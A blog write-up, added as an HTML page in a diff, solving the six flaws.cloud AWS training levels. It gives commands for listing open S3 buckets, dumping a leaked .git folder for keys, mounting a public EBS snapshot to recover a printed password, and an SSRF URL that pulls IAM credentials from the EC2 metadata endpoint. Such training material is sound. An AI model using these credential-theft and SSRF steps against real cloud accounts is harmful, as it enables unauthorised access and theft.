@@ -1,0 +1,354 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex" />
+
+  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->
+
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/stylesheet/style.min.css">
+
+    <link id="dark-theme-style" rel="stylesheet" type="text/css"
+          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+    href="https://ojack69.github.io/jacks-corner/theme/stylesheet/dark-theme.min.css">
+
+    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+          href="https://ojack69.github.io/jacks-corner/theme/pygments/monokai.min.css">
+    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: light)"
+          href="https://ojack69.github.io/jacks-corner/theme/pygments/emacs.min.css">
+
+
+  <link rel="stylesheet"
+        type="text/css"
+        href="https://ojack69.github.io/jacks-corner/theme/stork/stork.css" />
+
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/fontawesome.css">
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/brands.css">
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/solid.css">
+
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/custom.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/zoom.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/collapsible-toc.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/goals.css"> 
+
+
+      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
+      <script src="https://cdn.jsdelivr.net/npm/dompurify@3.2.4/dist/purify.min.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/collapsible-toc.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/zoom.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/app.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/goals.js" type="application/javascript"></script>
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+<meta name="author" content="Jack69" />
+<meta name="description" content="Level 1 Location: http://flaws.cloud/ Check that the site is hosted on AWS: dig flaws.cloud +short Confirm that flaws.cloud is a S3 bucket and get it&#39;s region by: nslookup 52.92.148.3 List bucket content with: aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2 Level …" />
+<meta name="keywords" content="">
+
+
+  <meta property="og:site_name" content="Jack's Corner"/>
+  <meta property="og:title" content="flaws.cloud Challenges"/>
+  <meta property="og:description" content="Level 1 Location: http://flaws.cloud/ Check that the site is hosted on AWS: dig flaws.cloud +short Confirm that flaws.cloud is a S3 bucket and get it&#39;s region by: nslookup 52.92.148.3 List bucket content with: aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2 Level …"/>
+  <meta property="og:locale" content="en_US"/>
+  <meta property="og:url" content="https://ojack69.github.io/jacks-corner/web/flaws.cloud.html"/>
+  <meta property="og:type" content="article"/>
+  <meta property="article:published_time" content="2025-03-18 00:00:00+01:00"/>
+  <meta property="article:modified_time" content=""/>
+  <meta property="article:author" content="https://ojack69.github.io/jacks-corner/author/jack69.html">
+  <meta property="article:section" content="Web"/>
+  <meta property="og:image" content="">
+
+  <title>Jack's Corner &ndash; flaws.cloud Challenges</title>
+
+
+</head>
+<body >
+
+<aside>
+  <div>
+    <a href="https://ojack69.github.io/jacks-corner/">
+      <img src="https://ojack69.github.io/jacks-corner/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
+    </a>
+
+    <h1>
+      <a href="https://ojack69.github.io/jacks-corner/">Jack's Corner</a>
+    </h1>
+
+
+    <div class="stork">
+        <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick=""/>
+      <div class="stork-output" data-stork="sitesearch-output"></div>
+    </div>
+
+
+    <ul class="social">
+      <li>
+        <a class="sc-htb"
+           href="https://app.hackthebox.com/profile/177323"
+           target="_blank">
+          <i class="fa-brands fa-htb"></i>
+        </a>
+      </li>
+      <li>
+        <a class="sc-thm"
+           href="https://tryhackme.com/p/jack69"
+           target="_blank">
+          <i class="fa-brands fa-thm"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+</aside>
+  <main>
+
+<nav>
+  <a href="https://ojack69.github.io/jacks-corner/">Home</a>
+
+  <a href="https://ojack69.github.io/jacks-corner/categories.html">Categories</a>
+  <a href="https://ojack69.github.io/jacks-corner/category/cheatsheet.html">Cheatsheets</a>
+  <a href="https://ojack69.github.io/jacks-corner/personal/goals.html">Goals</a>
+
+
+</nav>
+
+<article class="single">
+  <header>
+      
+    <h1 id="web/flaws.cloud">flaws.cloud Challenges</h1>
+    <p>
+
+    </p>
+  </header>
+
+
+  <div>
+        <div class="toc col-lg-3 hidden-xs hidden-sm">
+            <div id="toc"><ul><li><a class="toc-href" href="#level-1" title="Level 1">Level 1</a></li><li><a class="toc-href" href="#level-2" title="Level 2">Level 2</a></li><li><a class="toc-href" href="#level-3" title="Level 3">Level 3</a></li><li><a class="toc-href" href="#level-4" title="Level 4">Level 4</a></li><li><a class="toc-href" href="#level-5" title="Level 5">Level 5</a></li><li><a class="toc-href" href="#level-6" title="Level 6">Level 6</a></li></ul></div>
+        </div>
+    <h2 id="level-1">Level 1</h2>
+<p>Location: <a href="http://flaws.cloud/">http://flaws.cloud/</a></p>
+<p>Check that the site is hosted on AWS:</p>
+<div class="highlight"><pre><span></span><code>dig<span class="w"> </span>flaws.cloud<span class="w"> </span>+short
+</code></pre></div>
+<p><img alt="dig-flaws-cloud.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/dig-flaws-cloud.png"/></p>
+<p>Confirm that flaws.cloud is a S3 bucket and get it's region by:</p>
+<div class="highlight"><pre><span></span><code>nslookup<span class="w"> </span><span class="m">52</span>.92.148.3
+</code></pre></div>
+<p><img alt="nslookup-flaws-cloud-ip.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/nslookup-flaws-cloud-ip.png"/></p>
+<p>List bucket content with:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>s3<span class="w"> </span>ls<span class="w"> </span>s3://flaws.cloud/<span class="w"> </span>--no-sign-request<span class="w"> </span>--region<span class="w"> </span>us-west-2
+</code></pre></div>
+<p><img alt="level1-ls-bucket.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level1-ls-bucket.png"/></p>
+<p>Level 1 completed:</p>
+<p><img alt="level1-secret-page.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level1-secret-page.png"/></p>
+<h2 id="level-2">Level 2</h2>
+<p>Location: <a href="http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/">http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/</a></p>
+<p>Level 2 is similar to level 1 but requires to be authenticated to AWS; set credentials with:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>configure
+</code></pre></div>
+<p>List bucket content with:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>s3<span class="w"> </span>ls<span class="w"> </span>s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud<span class="w"> </span>--region<span class="w"> </span>us-west-2
+</code></pre></div>
+<p><img alt="level2-ls-bucket.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level2-ls-bucket.png"/></p>
+<p>Level 2 completed:</p>
+<p><img alt="level2-secret-page.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level2-secret-page.png"/></p>
+<h2 id="level-3">Level 3</h2>
+<p>Location: <a href="http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/">http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/</a></p>
+<p>List bucket content with:</p>
+<p><img alt="level3-ls-bucket.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level3-ls-bucket.png"/></p>
+<p>The <code>.git</code> folder content can be dumped using <code>git-dumper</code>:</p>
+<div class="highlight"><pre><span></span><code>git-dumper<span class="w"> </span>http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/<span class="w"> </span>./
+</code></pre></div>
+<p><img alt="level3-dump-git.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level3-dump-git.png"/></p>
+<p>Check git history:</p>
+<div class="highlight"><pre><span></span><code>git<span class="w"> </span>log
+</code></pre></div>
+<p><img alt="level3-git-history.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level3-git-history.png"/></p>
+<p>Check old commits with :</p>
+<div class="highlight"><pre><span></span><code>git<span class="w"> </span>diff<span class="w"> </span>f52ec03b227ea6094b04e43f475fb0126edb5a61
+</code></pre></div>
+<p><img alt="level3-git-diff.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level3-git-diff.png"/></p>
+<p>Save found keys in <code>~/.aws/configuration</code> as new named profile:</p>
+<p><img alt="level3-named-profile.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level3-named-profile.png"/></p>
+<p>List all buckets accessible by the configured profile:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>s3<span class="w"> </span>ls<span class="w"> </span>--region<span class="w"> </span>us-west-2<span class="w"> </span>--profile<span class="w"> </span>flaws.cloud
+</code></pre></div>
+<p><img alt="level3-list-all-buckets.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level3-list-all-buckets.png"/></p>
+<p>Complete Level 3 navigating to: <code>http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud</code></p>
+<h2 id="level-4">Level 4</h2>
+<p>Location: <a href="http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud">http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud</a></p>
+<p>This level goal is to access the web page running on <a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/</a></p>
+<p><img alt="level4-goal.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level4-goal.png"/></p>
+<p>This web page asks for a basic authentication:</p>
+<p><img alt="level4-basic-auth.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level4-basic-auth.png"/></p>
+<p>Using previous level credentials, it's not possible to list any content on the bucket but it's possible to list existing snapshots (filtering by "Tags not null" in order to filter out automatic snapshots): </p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>ec2<span class="w"> </span>describe-snapshots<span class="w"> </span>--query<span class="w"> </span><span class="s1">'Snapshots[?Tags!=null]'</span><span class="w"> </span>--profile<span class="w"> </span>flaws.cloud<span class="w"> </span>--region<span class="w"> </span>us-west-2
+</code></pre></div>
+<p><img alt="level4-enum-snapshots.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level4-enum-snapshots.png"/></p>
+<p>Having the snapshot id, it's possible to create a volume from this snapshot <strong>on the attacker</strong> EC2 service on the same region:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>ec2<span class="w"> </span>create-volume<span class="w"> </span>--availability-zone<span class="w"> </span>us-west-2a<span class="w"> </span>--snapshot-id<span class="w"> </span>snap-0b49342abd1bdcb89<span class="w"> </span>--region<span class="w"> </span>us-west-2
+</code></pre></div>
+<p><img alt="level4-create-volume.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level4-create-volume.png"/></p>
+<p>Check that the volume has been created on the console:</p>
+<p><img alt="level4-created-volume.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level4-created-volume.png"/></p>
+<p>Create a snapshot from the created volume:</p>
+<p><img alt="level4-create-snapshot.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level4-create-snapshot.png"/></p>
+<p>Create a new instance adding a second storage volume and specifying the previously created snapshot:</p>
+<p><img alt="level4-create-instance.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level4-create-instance.png"/></p>
+<p>After launching it, connect to the instance (via SSH or from the console) and mount the disk as follows:</p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>mkdir<span class="w"> </span>/media/level4
+lsblk
+sudo<span class="w"> </span>mount<span class="w"> </span>/dev/xvdb1<span class="w"> </span>/media/level4/
+ls<span class="w"> </span>-l
+</code></pre></div>
+<p><img alt="level4-mount-volume.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level4-mount-volume.png"/></p>
+<p>Following the nginx configuration:</p>
+<p><img alt="level4-nginx-configuration.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level4-nginx-configuration.png"/></p>
+<p>Generally, it could be worth trying cracking those hashes but this it's not the case.</p>
+<p>After some more enumeration, a cleartext password it's found:</p>
+<p><img alt="level4-credentials-leak.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level4-credentials-leak.png"/></p>
+<p>Password is: <code>nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M</code>.</p>
+<p>Using found credentials, it's possible to login to the web page:</p>
+<p><img alt="level4-win.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level4-win.png"/></p>
+<p>Note that, having the whole volume mounted, it was enough to simple access the web page html file located at <code>/media/level4/var/www/html/index.html</code>.</p>
+<h2 id="level-5">Level 5</h2>
+<p>From level 4 dumped nginx configuration file:</p>
+<p><img alt="level5-nginx-proxy.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level5-nginx-proxy.png"/></p>
+<p>It seems that an HTTP proxy function is configured at:</p>
+<div class="highlight"><pre><span></span><code>http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/&lt;destination http host&gt;
+</code></pre></div>
+<p>This function allows an attacker to perform SSRF and interact with the EC2 instance metadata:</p>
+<div class="highlight"><pre><span></span><code>http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data
+</code></pre></div>
+<p><img alt="level5-ssrf-metadata.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level5-ssrf-metadata.png"/></p>
+<p>Discover <code>flaws</code> user API keys:</p>
+<div class="highlight"><pre><span></span><code>http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws
+</code></pre></div>
+<p><img alt="level5-ssrf-metadata-credentials.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level5-ssrf-metadata-credentials.png"/></p>
+<p>Set found API keys in <code>~/.aws/credentials</code>.</p>
+<p><img alt="level5-credentials.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level5-credentials.png"/></p>
+<p><strong>Note that also the session token has been set.</strong></p>
+<p>Use found API keys to list level6 bucket content:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>s3<span class="w"> </span>ls<span class="w"> </span>s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud<span class="w"> </span>--profile<span class="w"> </span>level5.flaws.cloud<span class="w"> </span>--region<span class="w"> </span>us-west-2<span class="w"> </span>--recursive
+</code></pre></div>
+<p><img alt="level5-list-bucket-level6.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level5-list-bucket-level6.png"/></p>
+<p><img alt="level5-win.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level5-win.png"/></p>
+<h2 id="level-6">Level 6</h2>
+<p>Level 6 provides a set of credentials.</p>
+<p>Get current profile identity info:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>sts<span class="w"> </span>get-caller-identity<span class="w"> </span>--profile<span class="w"> </span>level6.flaws.cloud<span class="w"> </span>--region<span class="w"> </span>us-west-2
+</code></pre></div>
+<p><img alt="level6-sts-identity.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level6-sts-identity.png"/></p>
+<p>Get same information with another command:</p>
+<div class="highlight"><pre><span></span><code><span class="n">aws</span><span class="w"> </span><span class="n">iam</span><span class="w"> </span><span class="n">get</span><span class="o">-</span><span class="n">user</span><span class="w"> </span><span class="o">--</span><span class="n">profile</span><span class="w"> </span><span class="n">level6</span><span class="p">.</span><span class="n">flaws</span><span class="p">.</span><span class="n">cloud</span><span class="w"> </span><span class="o">--</span><span class="n">region</span><span class="w"> </span><span class="n">us</span><span class="o">-</span><span class="n">west</span><span class="o">-</span><span class="mh">2</span>
+</code></pre></div>
+<p><img alt="level6-iam-user.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level6-iam-user.png"/></p>
+<p>List policies attached to Level6:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>iam<span class="w"> </span>list-attached-user-policies<span class="w"> </span>--user-name<span class="w"> </span>level6<span class="w"> </span>--profile<span class="w"> </span>level6.flaws.cloud<span class="w"> </span>--region<span class="w"> </span>us-west-2
+</code></pre></div>
+<p><img alt="level6-user-policies.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level6-user-policies.png"/></p>
+<p>Get <code>list_apigateways</code> available versions:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>iam<span class="w"> </span>list-policy-versions<span class="w"> </span>--policy-arn<span class="w"> </span>arn:aws:iam::975426262029:policy/list_apigateways<span class="w"> </span>--profile<span class="w"> </span>level6.flaws.cloud<span class="w"> </span>--region<span class="w"> </span>us-west-2
+</code></pre></div>
+<p><img alt="level6-listapigateways-versions.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level6-listapigateways-versions.png"/></p>
+<p>Get permissions associated to <code>list_apigateways</code> - <code>v4</code> policy:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>iam<span class="w"> </span>get-policy-version<span class="w"> </span>--policy-arn<span class="w"> </span>arn:aws:iam::975426262029:policy/list_apigateways<span class="w"> </span>--version-id<span class="w"> </span>v4<span class="w"> </span>--profile<span class="w"> </span>level6.flaws.cloud<span class="w"> </span>--region<span class="w"> </span>us-west-2
+</code></pre></div>
+<p><img alt="level6-listapigateways-permission.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level6-listapigateways-permission.png"/></p>
+<p>Note that the user can perform some get operations on specific apigateway module's rest API  but cannot list every existing API so an API id is required in order to continue.</p>
+<p>List <code>MySecurityAudit</code> versions:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>iam<span class="w"> </span>list-policy-versions<span class="w"> </span>--policy-arn<span class="w"> </span>arn:aws:iam::975426262029:policy/MySecurityAudit<span class="w"> </span>--profile<span class="w"> </span>level6.flaws.cloud<span class="w"> </span>--region<span class="w"> </span>us-west-2
+</code></pre></div>
+<p><img alt="level6-mysecurityaudit-versions.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level6-mysecurityaudit-versions.png"/></p>
+<p>Get <code>MySecurityAudit</code> - <code>v1</code> capabilities:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>iam<span class="w"> </span>get-policy-version<span class="w"> </span>--policy-arn<span class="w"> </span>arn:aws:iam::975426262029:policy/MySecurityAudit<span class="w"> </span>--version-id<span class="w"> </span>v1<span class="w"> </span>--p
+rofile<span class="w"> </span>level6.flaws.cloud<span class="w"> </span>--region<span class="w"> </span>us-west-2
+</code></pre></div>
+<p><img alt="level6-mysecurityaudit-permissions.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level6-mysecurityaudit-permissions.png"/></p>
+<p><code>MySecurityAudit</code> has the <code>lambda:List*</code> permission which allows to list every existing lambda function:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>lambda<span class="w"> </span>list-functions<span class="w"> </span>--profile<span class="w"> </span>level6.flaws.cloud<span class="w"> </span>--region<span class="w"> </span>us-west-2
+</code></pre></div>
+<p><img alt="level6-list-lambda-functions.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level6-list-lambda-functions.png"/></p>
+<p>Also, the <code>lambda:GetPolicy</code> allows to obtain information about policies associated to a lambda function:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>lambda<span class="w"> </span>get-policy<span class="w"> </span>--function-name<span class="w"> </span>Level6<span class="w"> </span>--profile<span class="w"> </span>level6.flaws.cloud<span class="w"> </span>--region<span class="w"> </span>us-west-2
+</code></pre></div>
+<p><img alt="level6-lambda-level6-policy.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level6-lambda-level6-policy.png"/></p>
+<p>Function <code>Level6</code> has some permissions on the resource <code>arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6</code> which appears to be a rest API object. From this ARN it's possible to extract the resource id which is <code>s33ppypa75</code>.</p>
+<p>Using this id, get the rest API name which is <code>Level6</code>:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>apigateway<span class="w"> </span>get-rest-api<span class="w"> </span>--rest-api-id<span class="w"> </span>s33ppypa75<span class="w"> </span>--profile<span class="w"> </span>level6.flaws.cloud<span class="w"> </span>--region<span class="w"> </span>us-west-2
+</code></pre></div>
+<p><img alt="level6-get-api.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level6-get-api.png"/></p>
+<p>List available stages for function <code>Level6</code>:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>apigateway<span class="w"> </span>get-stages<span class="w"> </span>--rest-api-id<span class="w"> </span>s33ppypa75<span class="w"> </span>--profile<span class="w"> </span>level6.flaws.cloud<span class="w"> </span>--region<span class="w"> </span>us-west-2
+</code></pre></div>
+<p><img alt="level6-get-api-stages.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level6-get-api-stages.png"/></p>
+<p>Invoke the API:</p>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6
+</code></pre></div>
+<p><img alt="level6-curl-api.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level6-curl-api.png"/></p>
+<p>Win:</p>
+<p><img alt="level6-win.png" src="https://ojack69.github.io/jacks-corner/images/web/flaws.cloud/level6-win.png"/></p>
+  </div>
+  <div class="tag-cloud">
+    <p>
+    </p>
+  </div>
+
+
+
+
+
+
+</article>
+
+<footer>
+<p>&copy; Jack69 - 2025 </p>
+<p>
+Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
+  <span class="footer-separator">|</span>
+  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
+  <script id="dark-theme-script"
+          src="https://ojack69.github.io/jacks-corner/theme/dark-theme/dark-theme.min.js"
+          data-enable-auto-detect-theme="True"
+          data-default-theme="dark"
+          type="text/javascript">
+  </script>
+</p></footer>  </main>
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " Jack's Corner ",
+  "url" : "https://ojack69.github.io/jacks-corner",
+  "image": "",
+  "description": "My personal notes on stuff I like, nothing special"
+}
+</script>  <script>
+    window.loadStorkIndex = function () {
+      stork.initialize("https://ojack69.github.io/jacks-corner/theme/stork/stork.wasm")
+      stork.register("sitesearch", "https://ojack69.github.io/jacks-corner/search-index.st", { showProgress: false });
+    }
+  </script>
+  <script src="https://ojack69.github.io/jacks-corner/theme/stork/stork.js"></script>
+
+</body>
+</html>
